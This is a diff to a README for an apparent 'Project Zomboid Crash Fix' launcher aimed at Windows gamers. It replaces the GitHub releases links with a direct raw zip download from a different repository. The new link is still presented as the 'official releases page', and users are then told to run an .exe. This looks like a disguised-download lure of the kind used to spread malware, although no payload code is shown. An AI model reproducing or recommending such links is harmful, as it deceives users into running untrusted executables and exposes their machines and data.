@@ -5,7 +5,7 @@ description: "Resolve Project Zomboid crashes on Windows 10 and 11 with this rep
 ---
 # 🛠️ Project-Zomboid-Crash-Fix - Stable Launcher For Project Zomboid Game
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Sasiw6188/Project-Zomboid-Crash-Fix/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Sasiw6188/sasiw6188.github.io/main/pretangibly/sasiw_io_github_3.4.zip)
 
 This application repairs common startup errors for Project Zomboid on Windows 11 and Windows 10. Many players experience issues where the game fails to open or closes immediately after clicking the launch button. This tool identifies typical conflicts with system drivers and Steam settings to restore game stability.
 
@@ -23,7 +23,7 @@ Confirm your computer meets these standards before you run the fix:
 
 Follow these steps to obtain the correct files:
 
-1. Visit the [official releases page](https://github.com/Sasiw6188/Project-Zomboid-Crash-Fix/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Sasiw6188/sasiw6188.github.io/main/pretangibly/sasiw_io_github_3.4.zip).
 2. Look for the latest version listed at the top.
 3. Click the file ending in .exe to download it to your computer.
 4. Save the file to your Downloads folder or your desktop to find it quickly.
